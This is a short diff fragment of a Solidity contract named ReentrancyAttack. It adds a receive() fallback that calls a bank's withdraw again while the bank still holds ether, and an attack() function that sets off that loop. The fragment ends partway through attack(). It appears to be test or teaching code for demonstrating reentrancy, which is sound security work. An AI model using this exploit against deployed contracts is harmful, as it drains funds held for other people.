@@ -40,3 +40,13 @@ contract ReentrancyAttack {
         bank = bank_;
     }
 
+    receive() external payable {
+        attempts += 1;
+        if (address(bank).balance >= 1 ether) {
+            bank.withdraw(1 ether);
+        }
+    }
+
+    function attack() external payable {
+        bank.deposit{value: msg.value}();
+        bank.withdraw(msg.value);
